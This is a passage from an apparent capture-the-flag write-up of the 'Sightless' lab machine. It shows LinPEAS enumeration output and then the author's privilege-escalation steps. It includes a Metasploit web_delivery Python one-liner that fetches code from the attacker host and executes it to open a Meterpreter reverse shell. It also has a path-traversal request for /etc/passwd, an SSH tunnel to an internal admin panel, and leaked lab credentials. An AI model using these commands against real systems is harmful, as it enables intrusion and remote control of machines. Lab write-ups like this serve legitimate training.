CapPrm:	 0x0000000000000000=
CapEff:	 0x0000000000000000=
CapBnd:	 0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:	 0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/mtr-packet cap_net_raw=ep
/usr/bin/ping cap_net_raw=ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper cap_net_bind_service,cap_net_admin=ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#capabilities

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#ldso
/etc/ld.so.conf
Content of /etc/ld.so.conf:
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
  - /usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
  - /usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#profiles-files
total 36
drwxr-xr-x   2 root root 4096 Aug  9 11:30 .
drwxr-xr-x 114 root root 4096 Sep  3 08:19 ..
-rw-r--r--   1 root root   96 Oct 15  2021 01-locale-fix.sh
-rw-r--r--   1 root root  726 Nov 15  2021 bash_completion.sh
-rw-r--r--   1 root root 1107 Mar 23  2022 gawk.csh
-rw-r--r--   1 root root  757 Mar 23  2022 gawk.sh
-rw-r--r--   1 root root 1908 Mar 28  2022 vte-2.91.sh
-rw-r--r--   1 root root  967 Mar 28  2022 vte.csh
-rw-r--r--   1 root root 1557 Feb 17  2020 Z97-byobu.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#init-initd-systemd-and-rcd

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3500 Jan 31  2023 sbin.dhclient
-rw-r--r-- 1 root root  3448 Mar 17  2022 usr.bin.man
-rw-r--r-- 1 root root  1687 Feb  8  2024 usr.bin.tcpdump
-rw-r--r-- 1 root root  2006 Jan 17  2024 usr.sbin.mysqld
-rw-r--r-- 1 root root  1592 Nov 16  2021 usr.sbin.rsyslogd

═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No
═╣ Credentials in fstab/mtab? ........... No
═╣ Can I read shadow files? ............. No
═╣ Can I read shadow plists? ............ No
═╣ Can I write shadow plists? ........... No
═╣ Can I read opasswd file? ............. No
═╣ Can I write in network-scripts? ...... No
═╣ Can I read root folder? .............. No

╔══════════╣ Searching root files in home dirs (limit 30)
/home/
/home/michael/.bash_history
/home/michael/user.txt
/root/
/var/www

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r----- 1 root michael 33 Jan  8 23:15 /home/michael/user.txt

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root michael 33 Jan  8 23:15 /home/michael/user.txt

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
/dev/mqueue
/dev/shm
/home/michael
/run/lock
/run/screen
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/inaccessible
/run/user/1000/systemd/inaccessible/dir
/run/user/1000/systemd/inaccessible/reg
/run/user/1000/systemd/units
/tmp
/tmp/chisel
/tmp/exploit.py
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/test
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/crash/_opt_google_chrome_chrome.1000.crash
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files
  Group michael:
/tmp/exploit.py
/tmp/test.php
/tmp/test
/tmp/chisel


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════
                            ╚═════════════════════════╝
╔══════════╣ .sh files in path
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scriptbinaries-in-path
/usr/bin/gettext.sh
/usr/bin/rescan-scsi-bus.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2025-01-10+05:10:54.4512820550 /home/michael/X1yYwHsO
2025-01-09+05:43:03.7269686850 /tmp/exploit.py
2024-07-31+12:04:31.2520227370 /etc/console-setup/cached_setup_terminal.sh
2024-07-31+12:04:31.2520227370 /etc/console-setup/cached_setup_font.sh
2024-07-31+12:04:31.2480227370 /etc/console-setup/cached_setup_keyboard.sh
2024-05-15+03:10:27.7623258550 /etc/cloud/clean.d/99-installer

╔══════════╣ Unexpected in /opt (usually empty)
total 16
drwxr-xr-x  4 root root 4096 Aug  2 06:46 .
drwxr-xr-x 18 root root 4096 Sep  3 08:20 ..
drwx--x--x  4 root root 4096 May 15  2024 containerd
drwxr-xr-x  3 root root 4096 May 15  2024 google

╔══════════╣ Unexpected in root

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/journal/58de6fa49b4f4590a31b308f73d3bd9a/system.journal
/var/log/journal/58de6fa49b4f4590a31b308f73d3bd9a/user-1000.journal
/var/log/auth.log
/var/log/syslog
/var/log/laurel/audit.log


╔══════════╣ Files inside /home/michael (limit 20)
total 1904
drwxr-x--- 5 michael michael    4096 Jan 10 05:10 .
drwxr-xr-x 4 root    root       4096 May 15  2024 ..
lrwxrwxrwx 1 root    root          9 May 21  2024 .bash_history -> /dev/null
-rw-r--r-- 1 michael michael     220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 michael michael    3771 Jan  6  2022 .bashrc
drwx------ 3 michael michael    4096 Jan 10 21:21 .gnupg
-rwxrwxr-x 1 michael michael  828133 Jan  9 16:52 linpeas.sh
drwxrwxr-x 3 michael michael    4096 Jan  9 05:42 .local
-rw-r--r-- 1 michael michael     807 Jan  6  2022 .profile
-rw-rw-r-- 1 michael michael      66 Jan  9 16:35 .selected_editor
drwx------ 2 michael michael    4096 Jan  9 18:03 .ssh
-rw-r----- 1 root    michael      33 Jan  8 23:15 user.txt
-rwxrwxr-x 1 michael michael 1068952 Jan 10 05:10 X1yYwHsO

╔══════════╣ Files inside others home (limit 20)
/var/www/sightless/index.html
/var/www/sightless/images/hightech-background.png
/var/www/sightless/images/logo.png
/var/www/sightless/style.css

╔══════════╣ Searching installed mail applications

╔══════════╣ Mails (limit 50)

╔══════════╣ Backup folders
drwxr-xr-x 2 root root 4096 Jan  9 00:00 /var/backups
total 1240
-rw-r--r-- 1 root root  61440 Jan  9 00:00 alternatives.tar.0
-rw-r--r-- 1 root root   3197 May 16  2024 alternatives.tar.1.gz
-rw-r--r-- 1 root root  46826 Sep  3 08:25 apt.extended_states.0
-rw-r--r-- 1 root root   5084 Sep  3 08:19 apt.extended_states.1.gz
-rw-r--r-- 1 root root   5469 Aug  9 10:30 apt.extended_states.2.gz
-rw-r--r-- 1 root root   5476 Jul 31 13:08 apt.extended_states.3.gz
-rw-r--r-- 1 root root   5811 Jul 31 13:06 apt.extended_states.4.gz
-rw-r--r-- 1 root root   5834 May 21  2024 apt.extended_states.5.gz
-rw-r--r-- 1 root root   5771 May 15  2024 apt.extended_states.6.gz
-rw-r--r-- 1 root root      0 Jan  9 00:00 dpkg.arch.0
-rw-r--r-- 1 root root     32 May 16  2024 dpkg.arch.1.gz
-rw-r--r-- 1 root root    268 May 15  2024 dpkg.diversions.0
-rw-r--r-- 1 root root    140 May 15  2024 dpkg.diversions.1.gz
-rw-r--r-- 1 root root    172 May 15  2024 dpkg.statoverride.0
-rw-r--r-- 1 root root    161 May 15  2024 dpkg.statoverride.1.gz
-rw-r--r-- 1 root root 859049 Sep  3 08:25 dpkg.status.0
-rw-r--r-- 1 root root 222730 May 15  2024 dpkg.status.1.gz


╔══════════╣ Backup files (limited 100)
-rw-r--r-- 1 root root 0 Feb 17  2023 /var/lib/systemd/deb-systemd-helper-enabled/timers.target.wants/dpkg-db-backup.timer
-rw-r--r-- 1 root root 61 May 15  2024 /var/lib/systemd/deb-systemd-helper-enabled/dpkg-db-backup.timer.dsh-also
-rw-r--r-- 1 root root 2403 Feb 17  2023 /etc/apt/sources.list.curtin.old
-rw-r--r-- 1 root root 2082 May 15  2024 /etc/proftpd/tls.conf.frx.bak
-rw-r--r-- 1 root root 5819 May 15  2024 /etc/proftpd/proftpd.conf.frx.bak
-rw-r--r-- 1 root root 3454 May 15  2024 /etc/proftpd/modules.conf.frx.bak
-rwxr-xr-x 1 root root 1086 Oct 31  2021 /usr/src/linux-headers-5.15.0-119/tools/testing/selftests/net/tcp_fastopen_backup_key.sh
-rwxr-xr-x 1 root root 2196 Feb 23  2024 /usr/libexec/dpkg/dpkg-db-backup
-rw-r--r-- 1 root root 1423 May 15  2024 /usr/lib/python3/dist-packages/sos/report/plugins/__pycache__/ovirt_engine_backup.cpython-310.pyc
-rw-r--r-- 1 root root 1802 Jul 20  2023 /usr/lib/python3/dist-packages/sos/report/plugins/ovirt_engine_backup.py
-rw-r--r-- 1 root root 39456 Jul 24 11:08 /usr/lib/mysql/plugin/component_mysqlbackup.so
-rw-r--r-- 1 root root 10849 Aug  2 14:15 /usr/lib/modules/5.15.0-119-generic/kernel/drivers/power/supply/wm831x_backup.ko
-rw-r--r-- 1 root root 13113 Aug  2 14:15 /usr/lib/modules/5.15.0-119-generic/kernel/drivers/net/team/team_mode_activebackup.ko
-rw-r--r-- 1 root root 138 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.timer
-rw-r--r-- 1 root root 147 Dec  5  2021 /usr/lib/systemd/system/dpkg-db-backup.service
-rw-r--r-- 1 root root 44008 Dec  5  2023 /usr/lib/x86_64-linux-gnu/open-vm-tools/plugins/vmsvc/libvmbackup.so
-rw-r--r-- 1 root root 7867 Jul 16  1996 /usr/share/doc/telnet/README.old.gz
-rwxr-xr-x 1 root root 1513 Jan 23  2020 /usr/share/doc/libipc-system-simple-perl/examples/rsync-backup.pl
-rw-r--r-- 1 root root 416107 Dec 21  2020 /usr/share/doc/manpages/Changes.old.gz
-rwxr-xr-x 1 root root 226 Feb 17  2020 /usr/share/byobu/desktop/byobu.desktop.old
-rw-r--r-- 1 root root 2747 Feb 16  2022 /usr/share/man/man8/vgcfgbackup.8.gz
-rw-r--r-- 1 root root 11849 Aug  9 10:38 /usr/share/info/dir.old
-rw-r--r-- 1 root root 4096 Jan 10 21:21 /sys/devices/virtual/net/vetha676efc/brport/backup_port

╔══════════╣ Searching tables inside readable .db/.sql/.sqlite files (limit 100)
Found /var/lib/command-not-found/commands.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 873, cookie 0x4, schema 4, UTF-8, version-valid-for 5
Found /var/lib/fwupd/pending.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 4, database pages 9, cookie 0x5, schema 4, UTF-8, version-valid-for 4
Found /var/lib/PackageKit/transactions.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 8, cookie 0x4, schema 4, UTF-8, version-valid-for 5

 -> Extracting tables from /var/lib/command-not-found/commands.db (limit 20)
 -> Extracting tables from /var/lib/fwupd/pending.db (limit 20)
 -> Extracting tables from /var/lib/PackageKit/transactions.db (limit 20)

╔══════════╣ Web files?(output limit)
/var/www/:
total 16K
drwxr-xr-x  4 root     root     4.0K May 21  2024 .
drwxr-xr-x 15 root     root     4.0K Aug  9 11:30 ..
drwxrwx---  3 www-data www-data 4.0K Aug  9 10:56 html
drwxr-xr-x  4 www-data www-data 4.0K Aug  2 10:01 sightless

/var/www/sightless:
total 32K
drwxr-xr-x 4 www-data www-data 4.0K Aug  2 10:01 .

╔══════════╣ All relevant hidden files (not in /sys/ or the ones listed in the previous check) (limit 70)
-rw-r--r-- 1 root root 0 Jan  8 23:09 /run/network/.ifstate.lock
-rw-r--r-- 1 landscape landscape 0 Feb 17  2023 /var/lib/landscape/.cleanup.user
-rw-r--r-- 1 root root 220 Jan  6  2022 /etc/skel/.bash_logout
-rw------- 1 root root 0 Feb 17  2023 /etc/.pwd.lock
-rw-rw-r-- 1 michael michael 66 Jan  9 16:35 /home/michael/.selected_editor
-rw-r--r-- 1 michael michael 220 Jan  6  2022 /home/michael/.bash_logout

╔══════════╣ Readable files inside /tmp, /var/tmp, /private/tmp, /private/var/at/tmp, /private/var/tmp, and backup folders (limit 70)
-rwxrwxr-x 1 michael michael 10735 Jan  9 05:43 /tmp/exploit.py
-rwxr-xr-- 1 root root 33 Jan 10 07:25 /tmp/root.txt
-rw-rw-r-- 1 michael michael 0 Jan  9 05:39 /tmp/test.php
-rw-r--r-- 1 root root 0 Jan 10 07:25 /tmp/web1-access.log
-rw-r--r-- 1 root root 0 Jan 10 07:25 /tmp/web1-error.log
-rwxrwxr-x 1 michael michael 13893835 Jan 10 03:13 /tmp/chisel
-rw-r--r-- 1 root root 3197 May 16  2024 /var/backups/alternatives.tar.1.gz
-rw-r--r-- 1 root root 0 Jan  9 00:00 /var/backups/dpkg.arch.0
-rw-r--r-- 1 root root 32 May 16  2024 /var/backups/dpkg.arch.1.gz
-rw-r--r-- 1 root root 61440 Jan  9 00:00 /var/backups/alternatives.tar.0

╔══════════╣ Searching passwords in history files

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/etc/pam.d/common-password
/etc/ssl/froxlor_selfsigned.key
/usr/bin/systemd-ask-password
/usr/bin/systemd-tty-ask-password-agent
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/mysql/plugin/component_validate_password.so
/usr/lib/mysql/plugin/validate_password.so
/usr/lib/python3/dist-packages/docker/credentials
/usr/lib/python3/dist-packages/keyring/credentials.py
/usr/lib/python3/dist-packages/keyring/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/credentials.py
/usr/lib/python3/dist-packages/launchpadlib/__pycache__/credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/__pycache__/test_credential_store.cpython-310.pyc
/usr/lib/python3/dist-packages/launchpadlib/tests/test_credential_store.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-310.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/lib/python3/dist-packages/twisted/cred/credentials.py
/usr/lib/python3/dist-packages/twisted/cred/__pycache__/credentials.cpython-310.pyc
/usr/lib/systemd/systemd-reply-password
/usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path
/usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.path
/usr/lib/systemd/system/systemd-ask-password-console.service
/usr/lib/systemd/system/systemd-ask-password-plymouth.path
/usr/lib/systemd/system/systemd-ask-password-plymouth.service
  #)There are more creds/passwds files in the previous parent folder

/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/libsecret/git-credential-libsecret.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc.perl
/usr/share/doc/git/contrib/credential/netrc/t-git-credential-netrc.sh
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/icons/Adwaita/scalable/status/dialog-password-symbolic.svg
/usr/share/icons/Humanity/apps/24/password.png
/usr/share/icons/Humanity/apps/48/password.svg
/usr/share/icons/Humanity/status/16/dialog-password.png
/usr/share/icons/Humanity/status/24/dialog-password.png
/usr/share/icons/Humanity/status/48/dialog-password.svg
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords
/var/lib/fwupd/pki/secret.key
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs

╔══════════╣ Searching passwords inside logs (limit 70)
10.10.16.6 - - [09/Jan/2025:03:06:52 +0000] "GET /download?filename=../../../../etc/passwd HTTP/1.1" 200 722 "-" "curl/8.11.0"


                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════
                                ╚════════════════╝
Regexes to search for API keys aren't activated, use param '-r' 
```
Geez, this thing always has way too much info...one sec...

If we look here, we have a new subdomain to check out:
```Bash
╔══════════╣ Hostname, hosts and DNS
sightless
127.0.0.1 localhost
127.0.1.1 sightless
127.0.0.1 sightless.htb sqlpad.sightless.htb admin.sightless.htb
```

```Bash
michael@sightless:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
michael:x:1000:1000:michael:/home/michael:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
mysql:x:115:120:MySQL Server,,,:/nonexistent:/bin/false
proftpd:x:116:65534::/run/proftpd:/usr/sbin/nologin
ftp:x:117:65534::/srv/ftp:/usr/sbin/nologin
john:x:1001:1001:,,,:/home/john:/bin/bash
_laurel:x:998:998::/var/log/laurel:/bin/false
```
Found user *john* who is in sudoers file according to LinPEAS.

### EXPLOIT ATTEMPT B
A few guides reccommend tackling the local service running at:
*tcp        0      0 127.0.0.1:8080          0.0.0.0:\*               LISTEN      -*                   

In order to connect, let's attempt to use metasplot:
```Bash
[msf](Jobs:0 Agents:0) exploit(multi/script/web_delivery) >> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[msf](Jobs:1 Agents:0) exploit(multi/script/web_delivery) >> 
[*] Started reverse TCP handler on 10.10.14.46:1337 
[*] Using URL: http://10.10.14.46:8080/X1yYwHsO
[*] Server started.
[*] Run the following command on the target machine:
python -c "import sys;import ssl;u=__import__('urllib'+{2:'',3:'.request'}[sys.version_info[0]],fromlist=('urlopen',));r=u.urlopen('http://10.10.14.46:8080/X1yYwHsO', context=ssl._create_unverified_context());exec(r.read());"
```
```Bash
# after running
[*] 10.10.11.32      web_delivery - Delivering Payload (432 bytes)
[*] Sending stage (24772 bytes) to 10.10.11.32
[*] Meterpreter session 1 opened (10.10.14.46:1337 -> 10.10.11.32:36410) at 2025-01-10 15:52:16 -0600
```
> took me a bit to realize how to use
```bash
session -i 1
```
```Bash
sessions -i 1
[*] Starting interaction with 1...

(Meterpreter 1)(/home/michael) > sysinfo
Computer        : sightless
OS              : Linux 5.15.0-119-generic #129-Ubuntu SMP Fri Aug 2 19:25:20 UTC 2024
Architecture    : x64
System Language : en_US
Meterpreter     : python/linux
(Meterpreter 1)(/home/michael) > getuid
Server username: michael
```
```Bash
(Meterpreter 1)(/home/michael) > shell
Process 142496 created.
Channel 1 created.
ls
linpeas.sh
user.txt
X1yYwHsO
python3 -c 'import pty; pty.spawn("/bin/bash")'
michael@sightless:~$
```
> Okay...I already have SSH so maybe that was silly of me to do...?

```Bash
┌─[us-vip-1]─[10.10.14.46]─[gntsqid@htb-yc3xfb2qdy]─[~]
└──╼ [★]$ ssh -L 8181:127.0.0.1:8080 michael@sightless.htb
michael@sightless.htb's password: 
Last login: Fri Jan 10 22:18:03 2025 from 10.10.14.46
michael@sightless:~$ 
```
> IMPORTANT STEP
```Bash
┌─[us-vip-1]─[10.10.14.46]─[gntsqid@htb-yc3xfb2qdy]─[~]
└──╼ [★]$ cat /etc/hosts | grep admin
127.0.0.1 admin.sightless.htb
```


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/21f2f399-ab0f-45d3-a039-13d67f5e3c2d) returned 404 during the image audit (2026-10-08).


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/abbe5036-661d-40fa-8af9-c85358544cda) returned 404 during the image audit (2026-10-08).


> **I couldn't get it to work, but you are supposed to see in the network tab once you ge the right port the raw credentials**

These are *admin:ForlorfroxAdmin*

---
### POST EXPLOIT B


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/147477a5-5751-4d78-a7a5-178db72aed55) returned 404 during the image audit (2026-10-08).


Ensure the PHP-FPM is enable:\


> **Unavailable screenshot:** image. [Original GitHub attachment](https://github.com/user-attachments/assets/806848dd-9ebd-4f60-ac45-837d527800a2) returned 404 during the image audit (2026-10-08).


Now we can see that it goes into the /tmp dir

> ROOT FLAG FOUND
```Bash
michael@sightless:/tmp$ cat root.txt 
1869ea8d835d45cb0e7ee0d0e31347ba
```
**1869ea8d835d45cb0e7ee0d0e31347ba**

> NOTE: Alternatively it looks like maybe that shouldn't have been there?
>> We can see that root's ssh key is available to log in
```Bash
michael@sightless:/tmp$ ls -l id_rsa 
-rw------- 1 root root 3381 Jan 10 07:25 id_rsa
```
Then again...
```Bash
michael@sightless:/tmp$ ssh -i id_rsa -o StrictHostKeyChecking=no admin@localhost
Warning: Permanently added 'localhost' (ED25519) to the list of known hosts.
Load key "id_rsa": Permission denied
admin@localhost's password:
```
```Bash
┌─[us-vip-1]─[10.10.14.46]─[gntsqid@htb-yc3xfb2qdy]─[~]
└──╼ [★]$ scp michael@sightless.htb:/tmp/id_rsa .
michael@sightless.htb's password: 
scp: remote open "/tmp/id_rsa": Permission denied
```


